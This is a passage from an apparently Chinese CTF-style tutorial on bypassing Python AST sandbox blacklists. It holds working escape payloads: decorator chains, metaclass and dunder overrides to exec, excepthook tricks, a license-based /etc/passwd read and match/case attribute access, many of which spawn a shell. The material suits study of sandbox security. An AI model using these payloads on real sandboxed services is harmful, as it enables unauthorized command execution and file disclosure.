函数。</li><li>ast.ClassDef：表示 Python 类。</li><li>ast.Assign：表示 Python 的赋值语句。</li><li><a class="link" href="http://ast.Name">ast.Name <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：表示 Python 的变量名。</li></ol><p>使用 ast 模块可以让开发者方便地访问和修改 Python 代码的语法结构，例如可以用它来分析 Python 代码的复杂度、检查代码的安全性、提取代码中的关键字等等。<a class="link" href="https://blog.csdn.net/qq_43705697/article/details/130443928">python ast 详解与用法 - CSDN 博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>AST 沙箱会将用户的输入转化为操作码，此时字符串层面的变换基本上没用了，一般情况下考虑<strong>绕过 AST 黑名单</strong>。例如下面的沙箱禁止了  <code>ast.Import|ast.ImportFrom|ast.Call</code>  这三类操作，这样一来就无法导入模块和执行函数.</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">type</span>(x):</span><br><span class="line">      <span class="keyword">case</span> (ast.Import|ast.ImportFrom|ast.Call):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned statement <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">abspath = os.path.abspath(__file__)</span><br><span class="line">dname = os.path.dirname(abspath)</span><br><span class="line">os.chdir(dname)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-- Please enter code (last line must contain only --END)&quot;</span>)</span><br><span class="line">source_code = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  line = sys.stdin.readline()</span><br><span class="line">  <span class="keyword">if</span> line.startswith(<span class="string">&quot;--END&quot;</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  source_code += line</span><br><span class="line"></span><br><span class="line">tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line"><span class="keyword">if</span> verify_secure(tree):  <span class="comment"># Safe to execute!</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;-- Executing safe code:&quot;</span>)</span><br><span class="line">  compiled = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">  <span class="built_in">exec</span>(compiled)<span class="comment"># 获取 sys</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 os</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他的 payload 也都不会触发</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure></div><h4 id="without-call"><a class="markdownIt-Anchor" href="#without-call">#</a> without call</h4><p>如果基于 AST 的沙箱限制了执行函数，那么就需要找到一种不需要执行函数的方式执行系统命令.</p><h5 id="装饰器"><a class="markdownIt-Anchor" href="#装饰器">#</a> 装饰器</h5><p>利用 payload 如下，该 payload 实际上等效于 exec (input (X))</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@exec</span></span><br><span class="line"><span class="meta">@input</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div><p>当我们输入上述的代码后，Python 会打开输入，此时我们再输入 payload 就可以成功执行命令.</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; @<span class="built_in">exec</span></span><br><span class="line">... @input</span><br><span class="line">... class X:</span><br><span class="line">...     pass</span><br><span class="line">... </span><br><span class="line">&lt;class <span class="string">&#x27;__main__.X&#x27;</span>&gt;__import__(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>由于装饰器不会被解析为调用表达式或语句，因此可以绕过黑名单，最终传入的 payload 是由 input 接收的，因此也不会被拦截.</p><p>其实这样的话，构造其实可以有很多，比如使用单层的装饰器，打开 help 函数.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@help</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div><p>这样可以直接进入帮助文档:</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Help on class X <span class="keyword">in</span> module __main__:</span><br><span class="line"></span><br><span class="line">class X(builtins.object)</span><br><span class="line"> |  Data descriptors defined here:</span><br><span class="line"> |  </span><br><span class="line"> |  __dict__</span><br><span class="line"> |      dictionary <span class="keyword">for</span> instance variables (<span class="keyword">if</span> defined)</span><br><span class="line"> |  </span><br><span class="line"> |  __weakref__</span><br><span class="line"> |      list of weak references to the object (<span class="keyword">if</span> defined)</span><br><span class="line">(END)</span><br></pre></td></tr></table></figure></div><p>再次输入！sh 即可打开 /bin/sh</p><p>或是给装饰器加一些参数。</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_wrapper</span>(<span class="params">f</span>):</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@getattr(<span class="params">os,<span class="string">&quot;system&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@fake_wrapper</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">something</span>():</span><br><span class="line">  <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div><p>相当于：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(os,&quot;system&quot;)(fake_wrapper(something))</span><br></pre></td></tr></table></figure></div><p>亦或者自定义一个装饰器：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_wrapper</span>(<span class="params">f</span>):</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@os.system</span></span><br><span class="line"><span class="meta">@fake_wrapper</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">something</span>():</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>相当于  <code>os.system(fake_wrapper(something))</code> ，也就是  <code>os.system(‘/bin/sh’)</code></p><h5 id="函数覆盖"><a class="markdownIt-Anchor" href="#函数覆盖">#</a> 函数覆盖</h5><p>我们知道在 Python 中获取一个的属性例如  <code>obj[argument]</code>  实际上是调用的  <code>obj.__getitem__</code>  方法。因此只需要覆盖其  <code>__getitem__</code>  方法，即可在使用  <code>obj[argument]</code>  执行代码:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line"><span class="meta">... </span>    __getitem__ = <span class="built_in">exec</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A()[<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>]</span><br></pre></td></tr></table></figure></div><p>但是这里调用了 A 的构造函数，因此 AST 中还是会出现 ast.Call. 如何在不执行构造函数的情况下获取类实例呢？</p><h6 id="metaclass-利用"><a class="markdownIt-Anchor" href="#metaclass-利用">#</a> metaclass 利用</h6><p>Python 中提供了一种元类 (metaclass) 概念。元类是创建类的 “类”。在 Python 中，类本身也是对象，元类就是创建这些类（即类的对象）的类。</p><p>元类在 Python 中的作用主要是用来创建类。类是对象的模板，而元类则是类的模板。元类定义了类的行为和属性，就像类定义了对象的行为和属性一样。</p><p>下面是基于元类的 payload, 在不使用构造函数的情况下触发</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Metaclass</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    __getitem__ = <span class="built_in">exec</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span>(metaclass=Metaclass):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Sub[<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>]</span><br></pre></td></tr></table></figure></div><p>除了  <code>__getitem__</code>  之外其他方法的利用方式如下:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__sub__ (k - <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__mul__ (k * <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__floordiv__ (k // <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__truediv__ (k / <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__mod__ (k % <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__pow__ (k**<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__lt__ (k &lt; <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__le__ (k &lt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__eq__ (k == <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ne__ (k != <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ge__ (k &gt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__gt__ (k &gt; <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__iadd__ (k += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__isub__ (k -= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__imul__ (k *= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ifloordiv__ (k //= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__idiv__ (k /= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__itruediv__ (k /= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>) (Note that this only works when <span class="keyword">from</span> __future__ <span class="keyword">import</span> division <span class="keyword">is</span> <span class="keyword">in</span> effect.)</span><br><span class="line">__imod__ (k %= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ipow__ (k **= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ilshift__ (k&lt;&lt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__irshift__ (k &gt;&gt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__iand__ (k = <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ior__ (k |= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ixor__ (k ^= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>示例:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Metaclass</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    __sub__ = <span class="built_in">exec</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span>(metaclass=Metaclass):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Sub-<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure></div><h6 id="exceptions-利用"><a class="markdownIt-Anchor" href="#exceptions-利用">#</a> exceptions 利用</h6><p>利用 exceptions 的目的也是为了绕过显示地实例化一个类，如果一个类继承了 Exception 类，那么就可以通过 raise 关键字来实例化. payload 如下:</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RCE</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span></span><br><span class="line">    __iadd__ = <span class="built_in">exec</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">raise</span> RCE </span><br></pre></td></tr></table></figure></div><p>raise 会进入 RCE 的  <code>__init__</code> , 然后触发  <code>__iadd__</code>  也就是 exec.</p><p>当然，触发异常不一定需要 raise, 主动地编写错误代码也可以触发，与是就有了如下的几种 payload.</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c</span>):</span><br><span class="line">        self += <span class="string">&quot;os.system(&#x27;sh&#x27;)&quot;</span></span><br><span class="line">    __iadd__ = <span class="built_in">exec</span></span><br><span class="line">sys.excepthook = X</span><br><span class="line"><span class="number">1</span>/<span class="number">0</span></span><br></pre></td></tr></table></figure></div><p>这个 payload 中直接将 sys.excepthook 进行覆盖，任何异常产生时都会触发.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>():</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, c, d, e</span>):</span><br><span class="line">    self += <span class="string">&quot;print(open(&#x27;flag&#x27;).read())&quot;</span></span><br><span class="line">  __iadd__ = <span class="built_in">eval</span></span><br><span class="line">__builtins__.<span class="built_in">__import__</span> = X</span><br><span class="line">&#123;&#125;[<span class="number">1337</span>]</span><br></pre></td></tr></table></figure></div><p>这个 payload 将  <code>__import__</code>  函数进行覆盖，最后的 {}[1337] 在正常情况下会引发 KeyError 异常，因为 Python 在引发异常时会尝试导入某些模块（比如 traceback 模块），导入时就会触发  <code>__import__</code> .</p><h5 id="通过-license-函数读取文件"><a class="markdownIt-Anchor" href="#通过-license-函数读取文件">#</a> 通过 license 函数读取文件</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = __builtins__.<span class="built_in">help</span></span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> self, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> (a <span class="keyword">as</span> b):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div><p>上面的 payload 修改内建函数 license 的文件名列表为 /etc/passwd 当调用  <code>license()</code>  时会打印这个文件的内容.</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames</span><br><span class="line">[<span class="string">&#x27;/usr/lib/python3.11/../LICENSE.txt&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.11/../LICENSE&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.11/LICENSE.txt&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.11/LICENSE&#x27;</span>, <span class="string">&#x27;./LICENSE.txt&#x27;</span>, <span class="string">&#x27;./LICENSE&#x27;</span>]</span><br></pre></td></tr></table></figure></div><p>payload 中将 help 类的  <code>__enter__</code>  方法覆盖为  <code>license</code>  方法，而  <code>with</code>  语句在创建上下文时会调用 help 的 <code>__enter__</code> , 从而执行  <code>license</code>  方法。这里的 help 类只是一个载体，替换为其他的支持上下文的类或者自定义一个类也是可以的。例如:</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyContext</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">__builtins__.__dict__[<span class="string">&quot;license&quot;</span>]._Printer__filenames=[<span class="string">&quot;/etc/passwd&quot;</span>]</span><br><span class="line">a = MyContext()</span><br><span class="line">a.__class__.__enter__ = __builtins__.__dict__[<span class="string">&quot;license&quot;</span>]</span><br><span class="line">a.__class__.__exit__ = <span class="keyword">lambda</span> self, *args: <span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> (a <span class="keyword">as</span> b):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div><h4 id="绕过-astattribute-获取属性"><a class="markdownIt-Anchor" href="#绕过-astattribute-获取属性">#</a> 绕过 ast.Attribute 获取属性</h4><p>如何绕过 ast.Attribute？python 3.10 中引入了一个新的特性：match/case，类似其他语言中的 switch/case，但 match/case 更加强大，除了可以匹配数字字符串之外，还可以匹配字典、对象等。</p><p>最简单的示例，匹配字符串：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">item = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> item:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;One&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Two&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Two</span></span><br></pre></td></tr></table></figure></div><p>还可以匹配并自动赋值给局部变量，传入 (1,2) 时，会进入第二个分支，并对 x,y 赋值。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">item = (<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> item:</span><br><span class="line">    <span class="keyword">case</span> (x, y, z):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x&#125;</span> <span class="subst">&#123;y&#125;</span> <span class="subst">&#123;z&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> (x, y):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x&#125;</span> <span class="subst">&#123;y&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> (x,):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>对于基本类型的匹配比较好理解，下面是一个匹配类的示例：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        self.thing = value</span><br><span class="line"></span><br><span class="line">item = AClass(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> item:</span><br><span class="line">    <span class="keyword">case</span> AClass(thing=x):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Got <span class="subst">&#123;x = &#125;</span>!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Got x = 32!</span></span><br></pre></td></tr></table></figure></div><p>在这个示例中，重点关注 <code>case AClass(thing=x)</code> ，这里的含义并非是将 x 赋值给 thing，我们需要将其理解为一个表达式，表示匹配类型为 AClass 且存在 thing 属性的对象，并且 <strong>thing 属性值自动赋值给 x。</strong></p><p>这样一来就可以在不适用。号的情况下获取到类的属性值。例如获取  <code>''.__class__</code> ，可以编写如下的 match/case 语句：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">str</span>():</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">str</span>(__class__=x):</span><br><span class="line">        <span class="built_in">print</span>(x==<span class="string">&#x27;&#x27;</span>.__class__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># True</span></span><br></pre></td></tr></table></figure></div><p>可以看到 x 就是  <code>''.__class__</code> . 因为所有的类都输入 object 类，所以可以使用 object 来替代 str，这样就无需关注匹配到的到底是哪个类。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">str</span>():</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">object</span>(__class__=x):</span><br><span class="line">        <span class="built_in">print</span>(x==<span class="string">&#x27;&#x27;</span>.__class__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># True</span></span><br></pre></td></tr></table></figure></div><p>再测试一下该 payload 的 AST：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> ast </span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">match str():</span></span><br><span class="line"><span class="string">    case str(__class__=x):</span></span><br><span class="line"><span class="string">        print(x)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(ast.dump(ast.parse(a, mode=<span class="string">&#x27;exec&#x27;</span>), indent=<span 